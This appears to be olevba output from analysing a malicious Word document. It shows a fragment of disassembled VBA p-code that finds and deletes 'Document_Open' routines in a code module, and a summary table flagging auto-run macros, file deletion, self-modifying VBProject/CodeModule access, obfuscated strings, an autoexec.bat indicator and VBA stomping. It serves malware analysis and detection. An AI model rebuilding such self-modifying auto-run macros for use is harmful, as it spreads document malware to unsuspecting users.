' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0018 "Dim flagaltro As Boolean"
' 	Eq 
' 	IfBlock 
' Line #237:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #238:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #239:
' 	ExitFor 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #243:
' Line #244:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #245:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #246:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #247:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #248:
' Line #249:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #250:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #251:
' 	Loop 
' Line #252:
' Line #253:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #254:
' Line #255:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #256:
' 	EndIfBlock 
' Line #257:
' Line #258:
' 	OnError (GoTo 0) 
' Line #259:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

